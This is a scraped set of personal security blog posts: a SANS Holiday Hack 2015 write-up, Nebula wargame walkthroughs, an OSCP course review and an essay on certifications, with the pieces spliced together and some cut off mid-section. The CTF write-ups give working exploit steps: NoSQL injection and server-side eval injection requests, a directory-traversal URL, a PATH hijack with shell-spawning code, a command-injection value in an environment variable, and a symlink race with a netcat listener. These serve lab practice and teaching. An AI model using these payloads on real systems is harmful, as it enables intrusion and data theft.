gnomes.

Describe the technique you used to gain access to each SuperGnome’s gnome.conf file. YOU ARE AUTHORIZED TO ATTACK ONLY THE IP ADDRESSES THAT TOM HESSMAN IN THE DOSIS NEIGHBORHOOD EXPLICITLY ACKNOWLEDGES AS “IN SCOPE.” ATTACK NO OTHER SYSTEMS ASSOCIATED WITH THE HOLIDAY HACK CHALLENGE.\nI will answer these questions below by describing my methodology to attack the SuperGnomes.\nSG-01 SG-01 was accessed by logging into the SuperGnome web interface on 52.2.229.189 using the admin credentials admin:SittingOnAShelf found in the mongo database in the gnome firmware. After logging in, I explored the available features and was able to download each of the files, including gnome.conf:\n Gnome Serial Number: **NCC1701** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-01 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: Password Re-use\nGnome Serial Number: NCC1701 = [https://en.wikipedia.org/wiki/USS_Enterprise_(NCC-1701)]\nSG-02 I logged into SuperGnome-02 (52.34.3.80) with the same credentials, but when I tried to download the files was presented with an error specifying \u0026ldquo;Downloading disabled by Super-Gnome administrator.\u0026rdquo;\nI quickly identified a section in /settings that was not available on SG-01 containing an upload function. This could be the attack vector we need, let\u0026rsquo;s consult the firmware to identify any vulnerabilities:\n{% codeblock index.js %} // CAMERA VIEWER // STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file router.get('/cam', function(req, res, next) { var camera = unescape(req.query.camera); // check for .png //if (camera.indexOf('.png') == -1) // STUART: Removing this\u0026hellip;I think this is a better solution\u0026hellip; right? camera = camera + \u0026lsquo;.png\u0026rsquo;; // add .png if its not found console.log(\u0026ldquo;Cam:\u0026rdquo; + camera); fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) { if (e) { res.end(\u0026lsquo;File ./public/images/\u0026rsquo; + camera + ' does not exist or access denied!'); } }); fs.readFile('./public/images/' + camera, function (e, data) { res.end(data); }); }); {% endcodeblock %}\nThe code above was located in /www/routes/index.js. It appears that .png anywhere in the filename will satisfy the check.\nI successfully uploaded a directory named \u0026ldquo;foo.png/\u0026rdquo;.\n Dir /gnome/www/public/upload/UdmXdYtu/foo.png/ created successfully! Insufficient space! File creation error!  Then, I leveraged the LFI (local file inclusion) vulnerability to grab the gnome.conf.\n http://52.34.3.80/cam?camera=../upload/UdmXdYtu/foo.png/../../../../../www/files/gnome.conf  SG-02 gnome.conf:\n Gnome Serial Number: **XKCD988** Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg Allow new subordinates?: YES Camera monitoring?: YES Audio monitoring?: YES Camera update rate: 60min Gnome mode: SuperGnome Gnome name: SG-02 Allow file uploads?: YES Allowed file formats: .png Allowed file size: 512kb Files directory: /gnome/www/files/  Vulnerability: LFI and Directory Traversal\nGnome Serial Number: XKCD988 = [https://xkcd.com/988/]\nSG-03 SuperGnome-03 really stumped me for awhile. I tried logging into the web portal with the same admin credentials but was denied. The user account did work, but did not have sufficient permissions. After talking to some of the individuals in Dosis neighborhood, I learned about NoSQL injection. Looking at the LOGIN POST section of the firmware confirmed my suspicions. I include that code below for reference, it was located in the /www/routes/index.js file.\n{% codeblock index.js %} // LOGIN POST router.post('/', function(req, res, next) { var db = req.db; var msgs = []; db.get(\u0026lsquo;users\u0026rsquo;).findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.

Note: You can also use $gt here.\nI constructed a POST in Burp in order to bypass the login:\n POST / HTTP/1.1 Host: 52.64.191.71 User-Agent: merry xmas you filthy animal Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 ￼ Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://52.64.191.71/ Cookie: sessionid=duTDpykscaXdKJeH3ioC Connection: close Content-Type: application/json Content-Length: 68 { \u0026quot;username\u0026quot;: {\u0026quot;$eq\u0026quot;: \u0026quot;admin\u0026quot;}, \u0026quot;password\u0026quot;: {\u0026quot;$ne\u0026quot;: \u0026quot;\u0026quot;} }  After forwarding that post, I received:\n SuperGnome 03 Welcome admin, to the GIYH Administrative Portal.

A quick look around the menus reveals a new section under /files called \u0026ldquo;Upload New File\u0026rdquo;. It allows us to select a post-process option for the uploaded file.\nLet\u0026rsquo;s look at the gnome firmware for any vulnerabilities:\n{% codeblock index.js %} // FILES UPLOAD router.post('/files\u0026rsquo;, upload.single(\u0026lsquo;file\u0026rsquo;), function(req, res, next) { if (sessions[sessionid].logged_in === true \u0026amp;\u0026amp; sessions[sessionid].user_level \u0026gt; 99) { // NEDFORD: this should be 99 not 100 so admins can upload var msgs = []; file = req.file.buffer; if (req.file.mimetype === \u0026lsquo;image/png\u0026rsquo;) { msgs.push(\u0026lsquo;Upload successful.'); var postproc_syntax = req.body.postproc; console.log(\u0026ldquo;File upload syntax:\u0026rdquo; + postproc_syntax); if (postproc_syntax != \u0026lsquo;none\u0026rsquo; \u0026amp;\u0026amp; postproc_syntax !== undefined) { msgs.push(\u0026lsquo;Executing post process\u0026hellip;'); var result; d.run(function() { result = eval('(\u0026rsquo; + postproc_syntax + \u0026lsquo;)'); }); // STUART: (WIP) working to improve image uploads to do some post processing. msgs.push(\u0026lsquo;Post process result: ' + result); } msgs.push(\u0026lsquo;File pending super-admin approval.'); res.msgs = msgs; } else { msgs.push(\u0026lsquo;File not one of the approved formats: .png\u0026rsquo;); res.msgs = msgs; } } else title = \u0026ldquo;sans holiday challenge 2015 writeup\u0026rdquo; next(); }); {% endcodeblock %}\nThere is one major problem with this section of code, that eval is very dangerous. Let\u0026rsquo;s see if we can leverage it to perform some Sever Side Javascript Injection (SSJS). Here is my input from Burp:\n POST /files HTTP/1.1 Host: 52.192.152.132 User-Agent: merry xmas you filthy animal Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://52.192.152.132/files Cookie: sessionid=LRWk1JYQT2V8r6Xyu0th Connection: close Content-Type: multipart/form-data; boundary=---------------------------4590748351909491821833414779 Content-Length: 356 -----------------------------4590748351909491821833414779 Content-Disposition: form-data; name=\u0026quot;postproc\u0026quot; **require('fs').readFileSync('/gnome/www/files/gnome.conf')** -----------------------------4590748351909491821833414779 Content-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;foo.png\u0026quot; Content-Type: image/png bar -----------------------------4590748351909491821833414779--  Replacing the \u0026ldquo;postproc\u0026rdquo; call with our readFileSync command allows us to read the contents of gnome.conf.

I knew that it involved the code provided on the other SuperGnomes, sgnet and sgstatd.\nI looked at the source code and determined that there was an extra port open on SG-05.\nI probed it with netcat:\n mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242 Welcome to the SuperGnome Server Status Center! Please enter one of the following options: 1 - Analyze hard disk usage 2 - List open TCP sockets 3 - Check logged in users  Interesting. I explored each of the menu options, but did not detect anything that would assist with exploitation. Let\u0026rsquo;s take a look at the source code:\n{% codeblock sgtatd.c %} if (choice != 2) { write(sd, \u0026ldquo;\\nWelcome to the SuperGnome Server Status Center!\\n\u0026rdquo;, 51); write(sd, \u0026ldquo;Please enter one of the following options:\\n\\n\u0026rdquo;, 45); write(sd, \u0026ldquo;1 - Analyze hard disk usage\\n\u0026rdquo;, 28); write(sd, \u0026ldquo;2 - List open TCP sockets\\n\u0026rdquo;, 26); write(sd, \u0026ldquo;3 - Check logged in users\\n\u0026rdquo;, 27); fflush(stdout);\nrecv(sd, \u0026amp;choice, 1, 0);\nswitch (choice) { case 49: case 50: case 51: case 88: write(sd, \u0026ldquo;\\n\\nH\u0026rdquo;, 4); Truncated write(sd, \u0026ldquo;Enter a short message to share with GnomeNet (please allow 10 seconds) =\u0026gt; \u0026ldquo;, 75); fflush(stdin); sgstatd(sd); {% endcodeblock %}\nHm, the switch statement contains an extra case. The other case values appear to refer to the decimal value of the character (1=49, 2=50, 51=3). A quick look at an ASCII chart tells us that 88 = \u0026lsquo;X\u0026rsquo;.\nLet\u0026rsquo;s see if we can trigger the hidden menu item:\n{% codeblock lang:bash %} mike@foo:~/sans-holiday-hack-2015$ nc 54.233.105.81 4242\nWelcome to the SuperGnome Server Status Center!

On the morning of December 24, 2015, each individual burglar on this email list will receive a detailed itinerary of specific houses and an inventory of items to steal from each house, along with still photos of where to locate each item. The message will also include a specific path optimized for you to hit your assigned houses quickly and efficiently the night of December 24, 2015 after dark. Further, we've selected the items to steal based on a detailed analysis of what commands the highest prices on the hot-items open market. I caution you - steal only the items included on the list. DO NOT waste time grabbing anything else from a house. There's no sense whatsoever grabbing crumbs too small for a mouse! As to the details of the plan, remember to wear the Santa suit we provided you, and bring the extra large bag for all your stolen goods. If any children observe you in their houses that night, remember to tell them that you are actually \u0026quot;Santy Claus\u0026quot;, and that you need to send the specific items you are taking to your workshop for repair. Describe it in a very friendly manner, get the child a drink of water, pat him or her on the head, and send the little moppet back to bed. Then, finish the deed, and get out of there. It's all quite simple - go to each house, grab the loot, and return it to the designated drop-off area so we can resell it. And, above all, avoid Mount Crumpit! As we agreed, we'll split the proceeds from our sale 50-50 with each burglar. Oh, and I've heard that many of you are asking where the name ATNAS comes from. Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, we'll be stealing them! Thank you for your partnership in this endeavor. Signed: -CLW President and CEO of ATNAS Corporation  SG-04:\n From: \u0026quot;c\u0026quot; \u0026lt;c@atnascorp.com\u0026gt; To: \u0026lt;psychdoctor@whovillepsychiatrists.com\u0026gt; Subject: Answer To Your Question Date: Thu, 3 Dec 2015 13:38:15 -0500 Dr. O'Malley, In your recent email, you inquired: \\\u0026gt; When did you first notice your anxiety about the holiday season? Anxiety is hardly the word for it. It's a deep-seated hatred, Doctor. Before I get into details, please allow me to remind you that we operate under the strictest doctor-patient confidentiality agreement in the business. I have some very powerful lawyers whom I'd hate to invoke in the event of some leak on your part. I seek your help because you are the best psychiatrist in all of Who-ville. To answer your question directly, as a young child (I must have been no more than two), I experienced a life-changing interaction. Very late on Christmas Eve, I was awakened to find a grotesque green Who dressed in a tattered Santa Claus outfit, standing in my barren living room, attempting to shove our holiday tree up the chimney. My senses heightened, I put on my best little-girl innocent voice and asked him what he was doing. He explained that he was \u0026quot;Santy Claus\u0026quot; and needed to send the tree for repair. I instantly knew it was a lie, but I humored the old thief so I could escape to the safety of my bed. That horrifying interaction ruined Christmas for me that year, and I was terrified of the whole holiday season throughout my teen years. I later learned that the green Who was known as \u0026quot;the Grinch\u0026quot; and had lost his mind in the middle of a crime spree to steal Christmas presents. At the very moment of his criminal triumph, he had a pitiful change of heart and started playing all nicey-nice. What an amateur! When I became an adult, my fear of Christmas boiled into true hatred of the whole holiday season. I knew that I had to stop Christmas from coming. But how? I vowed to finish what the Grinch had started, but to do it at a far larger scale. Using the latest technology and a distributed channel of burglars, we'd rob 2 million houses, grabbing their most precious gifts, and selling them on the open market. We'll destroy Christmas as two million homes full of people all cry \u0026quot;BOO-HOO\u0026quot;, and we'll turn a handy profit on the whole deal. Is this \u0026quot;wrong\u0026quot;? I simply don't care. I bear the bitter scars of the Grinch's malfeasance, and singing a little \u0026quot;Fahoo Fores\u0026quot; isn't gonna fix that! What is your advice, doctor? Signed, Cindy Lou Who  SG-05:\n From: \u0026quot;Grinch\u0026quot; \u0026lt;grinch@who-villeisp.com\u0026gt; To: \u0026lt;c@atnascorp.com\u0026gt; Subject: My Apologies \u0026amp; Holiday Greetings Date: Tue, 15 Dec 2015 16:09:40 -0500 Dear Cindy Lou, I am writing to apologize for what I did to you so long ago. I wronged you and all the Whos down in Who-ville due to my extreme misunderstanding of Christmas and a deep-seated hatred. I should have never lied to you, and I should have never stolen those gifts on Christmas Eve. I realize that even returning them on Christmas morn didn't erase my crimes completely. I seek your forgiveness. You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at Christmas doesn't come from a store. In fact, I discovered that Christmas means a whole lot more! When I returned their gifts, the Whos embraced me. They forgave. I was stunned, and my heart grew even more. Why, they even let me carve the roast beast! They demonstrated to me that the holiday season is, in part, about forgiveness and love, and that's the gift that all the Whos gave to me that morning so long ago. I honestly tear up thinking about it. I don't expect you to forgive me, Cindy Lou. But, you have my deepest and most sincere apologies. And, above all, don't let my horrible actions from so long ago taint you in any way. I understand you've grown into an amazing business leader. You are a precious and beautiful Who, my dear. Please use your skills wisely and to help and support your fellow Who, especially during the holidays. I sincerely wish you a holiday season full of kindness and warmth, --The Grinch  It is also worth noting that we were able to collect Cindy\u0026rsquo;s password from this pcap:\n User: c Password: AllYourPresentsAreBelongToMe  104.196.40.60 is the IP she connects to\u0026hellip;\nMaybe next time!\nImage Evidence I collected up each of the staticky images from the SuperGnomes and used the tool Stegsolve.jar to xor the images and reveal the final image:\n9) Based on evidence you recover from the SuperGnomes’ packet capture ZIP files and any staticky images you find, what is the nefarious plot of ATNAS Corporation?\nAfter reviewing all of the evidence in the packet captures and images, we discover the nefarious plot of the ATNAS corp. Cindy Lou Who was traumatized by the witnessing the actions of the Grinch on that Christmas night. She has grown to hate Christmas and believes she can improve on the Grinch\u0026rsquo;s plan. Her plot is to distribute gnomes to as many homes as possible by Dec. 24.\nThe gnomes purpose is to gather information about the households, specifically the belongings in the homes. This information gathering includes taking still snapshots of the rooms they are placed in and sniffing network traffic for specific terms (outlined in sniffer_hit_list.txt). All of this info is sent to the associated SuperGnomes where it will be reviewed by ATNAS. ATNAS will use this information to organize and deploy burglars, dressed as Santa, to the homes to steal specific presents. These items will be sold and the profits will be split 50/50 between the ATNAS corp and the burglars.\nThe summary of the plan is revealed very eloquently by Cindy:\n \u0026quot;Oh, and I've heard that many of you are asking where the name ATNAS comes from. Why, it's reverse SANTA, of course. Instead of bringing presents on Christmas, we'll be stealing them.\u0026quot;  10) Who is the villain behind the nefarious plot.\nAs we can see in the email and photo evidence, Cindy Lou Who, President and CEO of ATNAS Corporation, is the mastermind behind the nefarious plot.\nConclusion What a great challenge and amazing learning experience. I would like to blame Netflix and \u0026ldquo;Making a Murderer\u0026rdquo; for sabotaging and preventing me from solving SG-05 before the submission deadline. :)\nIn all seriousness, I would like to thank all the folks over at SANS and CounterHack for their amazing work! I cannot wait to see what they have in store for next year!\nHad to include a final picture with one of my favorite people and birthday-sharer, Ed Skoudis.\nThanks!\nMike\n",

Maybe after more practice I will come back and attempt the intermediate and difficult/unreliable ways.\nAfter taking the time to dissect the code, I noticed an interesting detail: if the program cannot read the password file, it will log us in anyway. Let\u0026rsquo;s look at that file:\n level18@nebula:/home/flag18$ ls -l total 13 -rwsr-x--- 1 flag18 level18 12216 2011-11-20 21:22 flag18 -rw------- 1 flag18 flag18 37 2011-11-20 21:22 password  No simple ways to move or modify it with those permissions set, so it must be something else. It reminded me of an interesting error I encountered with one of my logging servers.\n \u0026quot;Too many open files(24)\u0026quot;  If we can hit that limit before the program attempts to access the password file, it won\u0026rsquo;t be able to allocate a file descriptor. Let\u0026rsquo;s check what the limit is with ulimit:\n level18@nebula:~$ ulimit -n 1024  1024 is the open file limit, but remember that we need to spare 3 to stdin, stdout and stderr. You can modify the limit with ulimit -n 4, but it did not work for me.

I use a while loop to create an infinite loop creating the symbolic link.\n level10@nebula:~$ echo \u0026quot;foo\u0026quot; \u0026gt; /tmp/fake level10@nebula:~$ while true; do ln -fs /tmp/fake token; ln -fs /home/flag10/token token; done  The next terminal contains another infinite loop containing my netcat listener (on port 18211 which was specified on line 38 of the original c code) that redirects the output to a file named \u0026ldquo;out\u0026rdquo;.\n level10@nebula:~$ while true; do nc -l 18211 \u0026gt;\u0026gt; out; done  The third terminal is used to call the flag10 program and provide my token using 127.0.0.1 as the host. This is also placed in an infinite loop, it will need to execute a number of times to trigger the race condition.\n level10@nebula:~$ while true; do /home/flag10/flag10 /home/level10/token 127.0.0.1; done  Finally, the last terminal tails my output file. I use this to watch for the token:\n level10@nebula:~$ tail -f out .oO Oo. foo .oO Oo. foo .oO Oo. foo .oO Oo. 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 .oO Oo. foo  Looks like the token is 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27.

This post will outline the steps I took to solve the challenge.\nI started by reading through the source code in order to locate the vulnerability:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\u0026quot;/usr/bin/env echo and now what?\u0026quot;); }  Almost immediately, I noticed that \u0026ldquo;echo\u0026rdquo; is being called without the absolute path. This is a major security vulnerability because the script will rely on the environment variables of the current shell (which can be tampered with).\nLet\u0026rsquo;s modify our path to include /tmp/:\nlevel01@nebula:/home/flag01$ PATH=/tmp:$PATH level01@nebula:/home/flag01$ export PATH level01@nebula:/home/flag01$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games  Now that /tmp is in the current path, we can create our own \u0026ldquo;echo\u0026rdquo; command. I have included C code below to spawn a shell. I used this code extensively in my OSCP studies as my payload when exploiting Linux/Unix boxes.\n#include \u0026lt;unistd.h\u0026gt; int main() { char *args[2]; args[0] = \u0026quot;/bin/sh\u0026quot;; args[1] = NULL; execve(args[0], args, NULL); }  A nice write-up on the code can be found here if you are curious about the creation and execution.\nAfter creating the new \u0026ldquo;echo\u0026rdquo; program, I need to compile the code.\nlevel01@nebula:/tmp$ gcc echo.c -o echo level01@nebula:/tmp$ ls echo echo.c vmware-root  Now I can call the original script, which will now run our \u0026ldquo;echo\u0026rdquo; program:\nlevel01@nebula:/home/flag01$ id uid=1002(level01) gid=1002(level01) groups=1002(level01) level01@nebula:/home/flag01$ ./flag01 sh-4.2$ id uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01) sh-4.2$ getflag You have successfully executed getflag on a target account  Success!\nMike\n",

    "body": "Level02 instructs us to review some vulnerable C code and locate the attack vector. This program addresses the vulnerability from the previous level but a new vector is available.\nThe source code is included below for reference:\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(\u0026amp;buffer, \u0026quot;/bin/echo %s is cool\u0026quot;, getenv(\u0026quot;USER\u0026quot;)); printf(\u0026quot;about to call system(\\\u0026quot;%s\\\u0026quot;)\\n\u0026quot;, buffer); system(buffer); }  As you can see, \u0026ldquo;echo\u0026rdquo; is called by its absolute path but getenv(\u0026quot;USER\u0026quot;)) is calling the environment variable $USER. Like the issue from level01, this variable is set in the current shell which can be manipulated.\nLet\u0026rsquo;s modify the $USER variable to contain different input.\nlevel02@nebula:/home/flag02$ echo ${USER} level02 level02@nebula:/home/flag02$ USER=\u0026quot;; /bin/bash; #\u0026quot; level02@nebula:/home/flag02$ echo ${USER} ; /bin/bash; #  As you can see in the code above, I modified the environment variable USER to contain \u0026quot;; /bin/bash; #\u0026quot;. The semicolons were added in order to stop the current command and start a new one, allowing us to stop the \u0026ldquo;echo\u0026rdquo; call and spawn a shell. Finally, I added an octothorp (#) in order to comment out the \u0026ldquo;is cool\u0026rdquo; line that would create malformed output.\nLet\u0026rsquo;s run flag02 and observe the results:\nlevel02@nebula:/home/flag02$ id uid=1003(level02) gid=1003(level02) groups=1003(level02) level02@nebula:/home/flag02$ ./flag02 about to call system(\u0026quot;/bin/echo ; /bin/bash; # is cool\u0026quot;) flag02@nebula:/home/flag02$ id uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02) flag02@nebula:/home/flag02$ getflag You have successfully executed getflag on a target account  It worked! This level demonstrates the danger of using environment variables in scripts and trusting user input.\nThanks for reading!\nMike\n",

    "body": "After completing some of my certifications, I decided to get back to some of the challenges and coding practice. My good friend Kristian suggested the war games over at Exploit Exercises. Starting with Nebula, I will outline some walkthroughs of my solutions to the levels (00-19). I will split each level into a separate post in order to not spoil any of the challenges for someone just looking for a hint on a single level.\nLevel00 requires you to locate a Set User ID program that will run as the \u0026ldquo;flag00\u0026rdquo; account. The \u0026ldquo;About\u0026rdquo; section hints at checking out the man page for the find command.\nI am very familiar with the find command from my SysAdmin tasks at work, so a quick one-liner should do the trick. The command below will search the entire filesystem for any file with SUID permissions owned by the flag00 user. The last part of the command 2\u0026gt;/dev/null sends standard error to /dev/null to avoid flooding the screen with permission denied messages.\nlevel00@nebula:~$ find / -perm -4000 -user flag00 2\u0026gt;/dev/null /bin/.../flag00  The output identifies the SUID program in a \u0026ldquo;hidden\u0026rdquo; directory that meets the find commands specifications. I refer to the directory as \u0026ldquo;hidden\u0026rdquo; because if you were to run the ls command in that directory (with no additional flags), the directory would not show up in the output.\nLets run the SetUID program:\nlevel00@nebula:~$ /bin/.../flag00 Congrats, now run getflag to get your flag! flag00@nebula:~$ getflag You have successfully executed getflag on a target account flag00@nebula:~$ id uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)  Success! Running the SetUID program escalated us to the flag00 user.\nThis first level seems simple but is teaching a very important concept in linux security. SetUID is a special type of file permissions given to a file. When a program has the SUID bit set (-rwsr-x---), it runs as the owner of the file instead of inheriting the permissions of the logged in user. There are some programs on a Linux/Unix system that require this capability (ping and passwd). These programs need root permissions in order to perform specific tasks and alter specific files on the system. System Administrators should be very careful when setting setuid and setguid because improper use of these access modes can lead to compromise of the system.\nMike\n",

    "body": "Introduction It was a long ride, but I finally finished my OSCP certification by completing the lab portion and passing the practical exam. I learned so much during the course and earned what I feel is a cert worth its weight in gold. As I have mentioned in previous blog posts, I take pride in guiding my professional development and I felt that taking a hands-on penetration testing course would be a great challenge and learning experience. This post summarizes my thoughts on the entire course and process.\nCourse Registration Offensive Security (offsec) offers 30, 60, or 90 days of lab time — I selected the 90 day option. After reading a plethora of reviews, I felt that it would help me to take my time and approach the course in a way that would allow me to learn the most information possible. Just a heads up - registration does require the use of a non-free email address (no gmail, yahoo, etc). I could expand on how the process works, but other reviews do an amazing job and the official FAQ page summarizes some additional info about registration here: http://www.offensive-security.com/faq/.\nThe Course Materials The materials are provided to help guide your learning and development. Offsec supplies the student with ~300 page PDF lab guide and a number of video segments. The lab guide contains a number of exercises that will assist with learning by having the student perform the task at hand. I found myself very familiar with some topics (SSH tunneling) and completely in the dark on the others (buffer overflows). I made sure that I took the time to perform extra research and practice the topics I was not as familiar with. I do recommend completing all the exercises, because it pays off in the long run and will even assist you with some of the boxes in the lab.\nThe Lab The lab is by far the best part about this course. If you have ever spun up a vulnerable VM (metasploitable, De-ICE, etc.) to practice attacking techniques, you know that you need to configure and setup your \u0026ldquo;lab\u0026rdquo; \u0026ndash; which can result in you learning hints about the machine. The Offsec lab gives you access to ~50 machines spread out across four networks that range in difficulty which was quite a change from attacking a single vulnerable VM. As you progress in the lab, you will uncover juicy details about the users and ultimately start to refer to the machines by name - aka \u0026ldquo;last night I rooted pain.\u0026rdquo;\nPersonally, I tried to own as much of the lab as possible. It taught me so much and gaining SYSTEM/root on some of the tougher systems definitely prepared me for the practical exam. At the end of my lab time, I got all the systems with the exception of two, I decided to start preparing for the exam instead of completing these boxes.\nIn terms of documentation, it really comes down to the student. The course guide recommends KeepNote, but I was more comfortable creating a directory structure and working with flat files that aligned with my daily process at work and my IR experience. My advice is to find what style works for you and document as much as possible. Enumeration is key and it is worth keeping all of your enumeration results so you can rotate to different machines in the lab and not re-scan every time.\nIf I could change one thing about my lab time, I would have drafted the final report as I went along. I read reviews that mentioned the same tactic but it is difficult to type up your step-by-step guide when you are running around your house celebrating because you got root! I did, however, use this tactic for the exam, which I describe later.\nWhen I was concentrating on the lab, I spent around four hours a day during the week and up to eight hours on the weekends. Just a quick warning - as soon as you sign up for this course and commit to spending all your time doing it, life will get in the way. Be prepared to isolate yourself to get it done. You need to put in the proper time to truly get the most out of this course.\nThe Exam As many other OSCP reviews have mentioned, there are limitations on the use of Metasploit as well as automated vulnerability scanners such as Nessus or OpenVAS. I wouldn\u0026rsquo;t lean on these tools too heavily in the lab but do not avoid them either. The lab is there for you to try different tools and techniques and there are different ways into each box, use that practice time to your advantage.\nOffsec allots you 24 hours to complete the exam and 24 hours to draft your accompanying report. I scheduled the exam for Saturday morning and ensured that I had enough coffee, snacks, energy drinks, music, etc. for the full 48-hour period. I received the email right on time, dove into the exam guide, connected to the VPN and buckled down on achieving my goal. After about eight hours, I had enough points to pass and I focused on gathering all the information and forming a rough draft of screenshots and evidence for my report to simply the report generation. I spent another two hours drafting a complete report. The next morning, I woke up and proofread the report, and finished tweaking any formatting. After I felt comfortable with my documentation, I submitted my report and received the notification that Offensive Security had received my deliverables. I should have felt confident at this point, but I couldn\u0026rsquo;t fight the doubt that I had forgotten something. All that was eradicated when I received the notice that I had successfully completed the certification challenge early Tuesday morning.\nAs far as recommendations for the exam, make sure that you are prepared for highs and lows. There will be times during your 24 hours that you will doubt your skills and think you were not ready for the test \u0026ndash; use that time to take a break and go for a walk or grab some grub. The other tips I have for the exam are: 1.) Enumerate until you understand the box like the SysAdmin would \u0026ndash; what\u0026rsquo;s running, any special configurations, any vulnerable versions? 2.) Organize your time and don\u0026rsquo;t become hyper-focused on one machine, multitasking helps. 3.) Compile a very rough draft of your report as you go. It was so helpful to have everything prepared and laid out for my report before my VPN access was clipped. It reduced my stress about missing something important. Don\u0026rsquo;t get too excited when you root a box and forget to collect the associated information and screenshots.\nConclusion This was the most challenging and rewarding course that I have ever experienced. You truly get what you put in with the OSCP. I spent hours (cough\u0026hellip; cough\u0026hellip; days) on some of these machines and learned so much by trying different attacks in the immense \u0026ldquo;playground\u0026rdquo; that Offsec generously assembled. My recommendation for those interested in taking the course is to spend as much time in the labs as possible. The motto \u0026ldquo;Try Harder\u0026rdquo; and the more difficult boxes will frustrate you but I promise when you finish the course you will miss the lab environment. The course was well worth the time and money and I have increased not only my attacking skills, but my overall security skills in the process.\nFeel free to comment or message me on twitter if you have any questions!\n-Mike (@mikeboya)\n",

    "body": "One of the most frequently asked questions I receive from individuals looking to enter the Information Security field is: \u0026ldquo;Should I pursue certifications?\u0026rdquo;\nI have had many in-depth conversation on this topic with my peers, so I\u0026rsquo;ll share my thoughts and logic on the subject here.\nThe answer to this question is not black and white \u0026ndash; it is subjective and highly dependent on the individual. I know several smart and knowledgeable professionals with 0 certifications, and an equal number of smart and knowledgeable professionals with 10-20 certs. That said, I have also met individuals with a large number of certifications who are lacking skills, and vice-versa.\nWhile some of my friends and colleagues have strict opinions on the topic, my view is this: you need to know yourself.\nI find exercise to be a helpful analogy in this case. For example: many people work out every single day and are in fantastic shape. I, however, am not one of those people. It\u0026rsquo;s difficult for me to get motivated and hit the gym \u0026ldquo;just because.\u0026rdquo; Instead, I need a short term goal in order to maintain my focus and guide my training. I recently completed my first Tough Mudder in Southern California and found it extremely beneficial to have an imminent event with a set date, motivating me to get prepared and exercise.\nAfter coming to this realization about myself, I acknowledged that the same applies to InfoSec. With a certification exam on the calendar, I\u0026rsquo;m more likely to skip an hour of TV at night and focus on studying instead. Again, this is not set in stone and I have self-taught myself on many different topics, but sometimes having an exam looming on the horizon can motivate me to really focus and learn a topic in-depth.\nI have yet to come across a course or certification from which I gained nothing, and I find that to be a telling sign that you get what you put in. As an individual who loves the command-line and prefers to cut up and massage data that way, I still found an excel course beneficial to my skillset. Others, even a few close friends of mine, are extremely skilled and do not feel the need to participate. They can stay in shape on their own, if you will.\nIn my current studies, I\u0026rsquo;ve come across two authors with the SANS GSE certification, Chris Sanders (Practical Packet Analysis, Applied NSM) and TJ O\u0026rsquo;Connor (Violent Python). With the technical knowledge and depth they broadcast through their writing and presentation of topics, I sense that a strong foundation was solidified by achieving this prestigious accolade. Just as I will continue to buy and read their work, I now view the SANS GSE as a credential I\u0026rsquo;d like to someday obtain.\nEarly in my career, I was influenced by more experienced InfoSec professionals. When making professional decisions, I would often change my own personal views depending on who I talked to. It took me a few years to realize that each decision is based on the individual and their learning style. In that respect, I hope that this post will help other young professionals.\nFor what it\u0026rsquo;s worth, having at least a few certifications will help you to get by human resources at larger companies. I won\u0026rsquo;t delve into this topic too much, but I will say that I never want to be restricted by something that is within my power to control.\nThe last point I will address is the cost of certifications. The process of using certifications to guide your short term goals can sometimes be obstructed by the financial cost of these courses. In my career, I have been lucky enough to work for a company that is invested in my training and development, fronting much of the cost for these certifications. I do have a great appreciation for companies with this mindset, though I find myself on both sides of the spectrum when it comes to paying your own way. If you are not fortunate enough to have an employer that will foot the bill as you sharpen your skill set, I would recommend that you save money and focus only on the training/certifications that will greatly increase your skills (or help you get past the HR screening process and on to a technical interview).\nOf course there are plenty of stances and opinions on the subject. If you would like to chat or share your thoughts, feel free to comment, message me on Twitter or send an email.\n-Mike (@mikeboya)\n",
